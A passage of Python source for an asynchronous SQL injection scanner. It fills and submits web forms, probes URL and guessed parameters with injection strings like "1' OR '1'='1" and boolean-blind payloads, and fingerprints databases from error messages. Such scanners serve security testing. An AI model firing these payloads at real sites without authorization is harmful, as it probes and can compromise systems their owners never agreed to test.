                                test_value = '1'
                            elif field_type == 'email':
                                test_value = 'test@example.com'
                            elif field_type == 'date':
                                test_value = '2022-01-01'
                            elif field_type == 'url':
                                test_value = 'http://example.com'
                            elif field_type == 'tel':
                                test_value = '1234567890'
                            elif field_type == 'color':
                                test_value = '#ffffff'
                            elif field_type == 'password':
                                test_value = 'password123'
                            elif field_type == 'search':
                                test_value = 'test search'
                            elif field_type == 'file':
                                # Skip file upload fields for SQL injection testing
                                form_data[field_name] = field_value
                                continue
                            else:  # text, hidden, etc.
                                test_value = 'test123'
                            
                            # Add the field to the form data with test value
                            form_data[field_name] = test_value
                            
                            # Consider most field types as injectable, including hidden fields
                            # which are often used for ID values that might be vulnerable
                            if field_type in ['text', 'hidden', 'password', 'search', 'number', 'email', 'tel', 'url', '']:
                                injectable_fields.append((field_name, test_value))
                            
                        # Skip forms without injectable fields
                        if not injectable_fields:
                            continue
                            
                        # Test each injectable field individually
                        for field_name, field_value in injectable_fields:
                            # Test for error-based SQL injection
                            error_vuln = await self._test_error_sqli(
                                form_action,
                                field_name,
                                field_value,
                                "form",
                                semaphore,
                                method=form_method
                            )
                            
                            if error_vuln:
                                vulnerabilities.append(error_vuln)
                                # Skip blind testing if error-based vulnerability is found
                                continue
                            
                            # Test for blind SQL injection
                            blind_vuln = await self._test_blind_sqli(
                                form_action,
                                field_name,
                                field_value,
                                "form",
                                semaphore,
                                method=form_method
                            )
                            
                            if blind_vuln:
                                vulnerabilities.append(blind_vuln)
                
                        # Test combinations of fields if there are multiple fields
                        # This can find vulnerabilities where multiple fields are combined in a query
                        if len(injectable_fields) > 1:
                            # Test pairs of fields with SQL injection payloads
                            for i, (field1_name, _) in enumerate(injectable_fields[:-1]):
                                for field2_name, _ in injectable_fields[i+1:]:
                                    # Create a copy of the form data for testing
                                    test_data = form_data.copy()
                                    
                                    # Set SQL injection payload in first field
                                    test_data[field1_name] = "1' OR '1'='1"
                                    
                                    # Send the request with the modified form data
                                    try:
                                        test_response = await self._make_rate_limited_request(
                                            form_action,
                                            method=form_method,
                                            data=test_data if form_method == 'post' else None,
                                            params=test_data if form_method == 'get' else None,
                                            headers=self.headers,
                                            semaphore=semaphore
                                        )
                                        
                                        if test_response:
                                            # Check for SQL errors in the response
                                            for pattern in self.sql_error_patterns:
                                                if re.search(pattern, test_response["text"], re.IGNORECASE):
                                                    # Found SQL error with field combination
                                                    dbms_type = self._identify_dbms_from_error(test_response["text"])
                                                    dbms_info = f" ({dbms_type})" if dbms_type else ""
                                                    
                                                    vulnerability = {
                                                        "id": str(uuid.uuid4()),
                                                        "name": f"SQL Injection in Form Fields{dbms_info}",
                                                        "description": f"A SQL injection vulnerability was detected in the combination of form fields '{field1_name}' and '{field2_name}'.",
                                                        "severity": "high",
                                                        "url": form_action,
                                                        "parameter": f"{field1_name},{field2_name}",
                                                        "evidence": f"Fields: {field1_name}, {field2_name}\nPayload: 1' OR '1'='1\nForm method: {form_method}",
                                                        "remediation": "Use parameterized queries or prepared statements. Validate and sanitize all form inputs."
                                                    }
                                                    
                                                    vulnerabilities.append(vulnerability)
                                                    break
                                    except Exception as e:
                                        logger.error(f"Error testing form field combination on {form_action}: {str(e)}")
                
                # Also check for forms created dynamically with JavaScript
                # by looking for form-like structures in the HTML
                try:
                    input_elements = soup.find_all('input')
                    if input_elements:
                        potential_form_groups = {}
                        
                        # Group input elements by their parent containers
                        for input_el in input_elements:
                            if input_el.get('name'):
                                parent = input_el.parent
                                if parent not in potential_form_groups:
                                    potential_form_groups[parent] = []
                                potential_form_groups[parent].append(input_el)
                        
                        # Test potential form groups with multiple inputs
                        for parent, inputs in potential_form_groups.items():
                            if len(inputs) >= 2:  # At least 2 inputs to be a potential form
                                injectable_fields = []
                                
                                for input_el in inputs:
                                    field_name = input_el.get('name', '')
                                    field_type = input_el.get('type', 'text').lower()
                                    
                                    if field_name and field_type in ['text', 'hidden', 'password', 'search', 'number']:
                                        injectable_fields.append((field_name, '1'))
                                
                                # Test each potential form field
                                for field_name, field_value in injectable_fields:
                                    # Test for error-based SQL injection on the current URL
                                    # (since we don't know the form's submission endpoint)
                                    error_vuln = await self._test_error_sqli(
                                        url,
                                        field_name,
                                        field_value,
                                        "form",
                                        semaphore,
                                        method="post"  # Assume POST as default for dynamic forms
                                    )
                                    
                                    if error_vuln:
                                        vulnerabilities.append(error_vuln)
                except Exception as e:
                    logger.error(f"Error checking dynamic forms on {url}: {str(e)}")
            except Exception as e:
                logger.error(f"Error checking forms on {url}: {str(e)}")
        
        return vulnerabilities
    
    async def _check_headers(self, url: str, semaphore: asyncio.Semaphore) -> List[Dict[str, Any]]:
        """
        Check HTTP headers for SQL injection vulnerabilities.
        
        Args:
            url: The URL to check
            semaphore: Semaphore for limiting concurrent requests
            
        Returns:
            List of vulnerabilities found
        """
        # For now, just return an empty list
        # In a real implementation, this would test HTTP headers for SQL injection
        return []
    
    async def _check_graphql_endpoints(self, url: str, semaphore: asyncio.Semaphore) -> List[Dict[str, Any]]:
        """
        Check GraphQL endpoints for SQL injection vulnerabilities.
        
        Args:
            url: The URL to check
            semaphore: Semaphore for limiting concurrent requests
            
        Returns:
            List of vulnerabilities found
        """
        # For now, just return an empty list
        # In a real implementation, this would test GraphQL endpoints for SQL injection
        return []
    
    async def _check_json_endpoints(self, url: str, semaphore: asyncio.Semaphore) -> List[Dict[str, Any]]:
        """
        Check JSON API endpoints for SQL injection vulnerabilities.
        
        Args:
            url: The URL to check
            semaphore: Semaphore for limiting concurrent requests
            
        Returns:
            List of vulnerabilities found
        """
        # For now, just return an empty list
        # In a real implementation, this would test JSON API endpoints for SQL injection
        return []

    async def _classify_error(self, error: Exception, status_code: Optional[int] = None) -> str:
        """
        Classify an error as transient or critical.
        
        Args:
            error: The exception
            status_code: HTTP status code if available
            
        Returns:
            str: Error classification - "transient" or "critical"
        """
        error_str = str(error).lower()
        
        # Network-related transient errors
        if isinstance(error, (aiohttp.ClientConnectorError, aiohttp.ServerTimeoutError, 
                             aiohttp.ClientOSError, asyncio.TimeoutError)):
            return "transient"
            
        # Connection reset and similar errors
        if "connection reset" in error_str or "broken pipe" in error_str or "connection refused" in error_str:
            return "transient"
            
        # Timeouts
        if "timeout" in error_str or "timed out" in error_str:
            return "transient"
            
        # Rate limiting or temporary server issues (based on status code)
        if status_code in [429, 503, 502, 504]:
            return "transient"
            
        # Critical errors (server failures, access denied)
        if status_code in [500, 501, 403, 401]:
            return "critical"
            
        # Default to treating unknown errors as critical
        return "critical"
    
    async def _make_rate_limited_request(self, url: str, method="GET", data=None, 
                                   headers=None, params=None, json_data=None, 
                                   semaphore=None, retries=3,
                                   allow_redirects=True) -> Optional[Dict[str, Any]]:
        """
        Make a rate-limited HTTP request with retry logic.
        
        Args:
            url: The URL to request
            method: HTTP method
            data: Form data
            headers: HTTP headers
            params: URL parameters
            json_data: JSON data for request body
            semaphore: Semaphore for limiting concurrent requests
            retries: Maximum number of retries
            allow_redirects: Whether to follow redirects
            
        Returns:
            Optional[Dict[str, Any]]: Response data or None if request failed
        """
        parsed_url = urlparse(url)
        hostname = parsed_url.netloc
        
        # Use default headers if none provided
        if not headers:
            headers = self.headers.copy()
        
        # Start retry loop with exponential backoff
        retry_count = 0
        last_error = None
        
        while retry_count <= retries:
            try:
                # Apply rate limiting
                await self._apply_rate_limiting(hostname)
                
                # Acquire semaphore if provided
                if semaphore:
                    async with semaphore:
                        start_time = time.time()
                        response = await self._perform_request(url, method, data, headers, params, 
                                                        json_data, allow_redirects)
                        response_time = time.time() - start_time
                else:
                    start_time = time.time()
                    response = await self._perform_request(url, method, data, headers, params, 
                                                    json_data, allow_redirects)
                    response_time = time.time() - start_time
                
                # Report success with response time
                self.rate_limiter.report_success(hostname, response_time)
                
                # Return the response data
                return response
                
            except Exception as e:
                # Get status code if it's in the exception
                status_code = None
                if hasattr(e, 'status'):
                    status_code = e.status
                
                # Classify error type
                error_type = await self._classify_error(e, status_code)
                
                # Report error to rate limiter
                self.rate_limiter.report_error(hostname, error_type)
                
                # Log the error
                logger.error(f"Request error ({error_type}) for {url}: {str(e)}")
                
                # Store the error
                last_error = e
                
                # Increment retry counter
                retry_count += 1
                
                # If we have retries left and this is a transient error, try again
                if retry_count <= retries and error_type == "transient":
                    # Calculate backoff time with jitter
                    backoff_time = min(60, (2 ** retry_count)) * random.uniform(0.75, 1.25)
                    logger.debug(f"Retrying in {backoff_time:.2f}s (attempt {retry_count}/{retries})")
                    await asyncio.sleep(backoff_time)
                else:
                    # Critical error or out of retries
                    break
        
        # If we get here, all retries failed
        logger.warning(f"Request to {url} failed after {retries} retries. Last error: {str(last_error)}")
        return None
        
    async def _perform_request(self, url: str, method, data, headers, params, 
                        json_data, allow_redirects) -> Dict[str, Any]:
        """
        Perform the actual HTTP request.
        
        Args:
            url: The URL to request
            method: HTTP method
            data: Form data
            headers: HTTP headers
            params: URL parameters
            json_data: JSON data for request body
            allow_redirects: Whether to follow redirects
            
        Returns:
            Dict[str, Any]: Response data
        """
        # Log the request
        logger.debug(f"Making {method} request to {url}")
        
        async with aiohttp.ClientSession() as session:
            async with session.request(
                method=method,
                url=url,
                data=data,
                headers=headers,
                params=params,
                json=json_data,
                allow_redirects=allow_redirects,
                timeout=aiohttp.ClientTimeout(total=15)  # 15 second timeout
            ) as response:
                # Read response text
                text = await response.text()
                
                # Return response data
                return {
                    "status": response.status,
                    "text": text,
                    "url": str(response.url),
                    "headers": {k.lower(): v for k, v in response.headers.items()},
                    "duration": 0.0  # Will be calculated in calling function
                }

    def _generate_boolean_test_payloads(self, param_value: str) -> List[Dict[str, Any]]:
        """
        Generate boolean-based test payloads for SQL injection testing.
        Creates pairs of tests where one should be true and one should be false
        to detect blind SQLi vulnerabilities.
        
        Args:
            param_value: The original parameter value to modify
            
        Returns:
            List of payloads with expected behavior
        """
        payloads = []
        
        # For each test, create both a true and false variant
        # Test with different quote styles and parentheses combinations
        for use_parenthesis in (False, True):
            for separator in ("", "'", "\""):
                # Generate random numbers for the test conditions
                for _ in range(2):  # Create 2 negative tests
                    value1 = random.randint(10, 99)
                    value2 = random.randint(10, 99) + value1  # Ensure different values
                    padding_value = random.randint(10, 99)
                    
                    # Format string with or without parentheses
                    if use_parenthesis:
                        fmt_string = f"{param_value}{separator}) AND {value1}={value2} AND ({separator}{padding_value}{separator}={separator}{padding_value}"
                    else:
                        fmt_string = f"{param_value}{separator} AND {value1}={value2} AND {separator}{padding_value}{separator}={separator}{padding_value}"
                    
                    # This should evaluate to false and not change the page
                    payloads.append({
                        "payload": fmt_string,
                        "expected_result": False,
                        "type": "boolean"
                    })
                
                # Generate random numbers for true conditions
                for _ in range(2):  # Create 2 positive tests
                    value1 = random.randint(10, 99)
                    padding_value = random.randint(10, 99)
                    
                    # Format string with or without parentheses
                    if use_parenthesis:
                        fmt_string = f"{param_value}{separator}) AND {value1}={value1} AND ({separator}{padding_value}{separator}={separator}{padding_value}"
                    else:
                        fmt_string = f"{param_value}{separator} AND {value1}={value1} AND {separator}{padding_value}{separator}={separator}{padding_value}"
                    
                    # This should evaluate to true and maintain the original page
                    payloads.append({
                        "payload": fmt_string,
                        "expected_result": True,
                        "type": "boolean"
                    })
        
        return payloads

    def _identify_dbms_from_error(self, response_text: str) -> str:
        """
        Identify the database type from error messages in the response.
        Based on Wapiti's approach to fingerprint the DBMS.
        
        Args:
            response_text: The response text to analyze
            
        Returns:
            String identifier of the database or empty string if not identified
        """
        # Check for MySQL
        mysql_patterns = [
            r"sql syntax.*mysql",
            r"warning.*mysql",
            r"mysql.*error",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"check the manual that (corresponds to|fits) your MySQL server version",
            r"MySqlClient\."
        ]
        for pattern in mysql_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return "MySQL"
                
        # Check for MariaDB
        if re.search(r"check the manual that (corresponds to|fits) your MariaDB server version", 
                    response_text, re.IGNORECASE):
            return "MariaDB"
                
        # Check for PostgreSQL
        postgres_patterns = [
            r"postgresql.*error",
            r"PostgreSQL.*?ERROR",
            r"ERROR:\s\ssyntax error at or near",
            r"ERROR: parser: parse error at or near",
            r"PostgreSQL query failed"
        ]
        for pattern in postgres_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return "PostgreSQL"
                
        # Check for Microsoft SQL Server
        mssql_patterns = [
            r"microsoft.*database",
            r"microsoft.*driver",
            r"microsoft.*server",
            r"microsoft.* sql",
            r"Driver.*? SQL[\-\_\ ]*Server",
            r"OLE DB.*? SQL Server",
            r"\bSQL Server[^&lt;&quot;]+Driver",
            r"\[SQL Server\]",
            r"ODBC SQL Server Driver"
        ]
        for pattern in mssql_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return "Microsoft SQL Server"
                
        # Check for Oracle
        oracle_patterns = [
            r"oracle.*error",
            r"oracle.*driver",
            r"ora-[0-9]",
            r"\bORA-\d{5}",
            r"Oracle error"
        ]
        for pattern in oracle_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return "Oracle"
                
        # Check for SQLite
        sqlite_patterns = [
            r"sqlite.*error",
            r"sqlite.*syntax",
            r"SQLite/JDBCDriver",
            r"SQLite\.Exception",
            r"\[SQLITE_ERROR\]"
        ]
        for pattern in sqlite_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return "SQLite"
                
        # Check for generic SQL errors
        generic_patterns = [
            r"sql syntax.*error",
            r"syntax error.*sql",
            r"sql command.*not properly ended",
            r"sqlexception",
            r"sqlstate",
            r"unclosed.*mark"
        ]
        for pattern in generic_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return "SQL Database"
                
        # No specific database identified
        return ""

    async def _process_url(self, url: str, semaphore: asyncio.Semaphore) -> List[Dict[str, Any]]:
        """
        Process a single URL by checking it for SQL injection vulnerabilities using all available check methods.
        
        Args:
            url: The URL to scan
            semaphore: Semaphore for limiting concurrent requests
            
        Returns:
            List of vulnerabilities found
        """
        vulnerabilities = []
        
        try:
            # Make sure domain_throttling is initialized
            if not hasattr(self, 'domain_throttling'):
                self.domain_throttling = defaultdict(int)
                
            # Test the URL for parameter-based SQL injection
            params_vulns = await self._check_url_parameters(url, semaphore)
            vulnerabilities.extend(params_vulns)
            
            # If the URL doesn't have parameters, try to add some common parameter names
            # This can find hidden vulnerabilities in endpoints that expect parameters
            parsed_url = urlparse(url)
            if not parsed_url.query:
                common_params = ['id', 'search', 'query', 'item', 'page', 'user', 'cat', 'product']
                for param in common_params:
                    # Add a simple numeric value as parameter
                    param_url = f"{url}{'&' if '?' in url else '?'}{param}=1"
                    param_vulns = await self._check_url_parameters(param_url, semaphore)
                    vulnerabilities.extend(param_vulns)
                    
                    # Try with string value too (some endpoints behave differently)
                    param_url = f"{url}{'&' if '?' in url else '?'}{param}=test"
                    param_vulns = await self._check_url_parameters(param_url, semaphore)
                    vulnerabilities.extend(param_vulns)
                    
                    # Break early if we find vulnerabilities to avoid excessive testing
                    if param_vulns:
                        break
            
            # Test the URL for form-based SQL injection with enhanced form detection
            form_vulns = await self._check_forms(url, semaphore)
            vulnerabilities.extend(form_vulns)
            
            # Test common search form query parameter variations
            # Many search forms are vulnerable to SQL injection
            search_params = ['q', 'search', 'query', 'find', 'keyword', 'term']
            for param in search_params:
                search_url = f"{url}{'&' if '?' in url else '?'}{param}=test"
                search_vulns = await self._check_url_parameters(search_url, semaphore)
                vulnerabilities.extend(search_vulns)
                if search_vulns:
                    break  # Found vulnerability, no need to test more search params
            
            # Test the URL for header-based SQL injection
            header_vulns = await self._check_headers(url, semaphore)
            vulnerabilities.extend(header_vulns)
            
            # If the URL seems like a potential GraphQL endpoint, test it
            if "graphql" in url.lower() or "query" in url.lower():
                graphql_vulns = await self._check_graphql_endpoints(url, semaphore)
                vulnerabilities.extend(graphql_vulns)
            
            # If the URL seems like a potential JSON API, test it
            if "api" in url.lower() or "json" in url.lower() or "rest" in url.lower():
                json_vulns = await self._check_json_endpoints(url, semaphore)
                vulnerabilities.extend(json_vulns)
                
        except Exception as e:
            logger.error(f"Error processing URL {url}: {str(e)}")
            
        return vulnerabilities
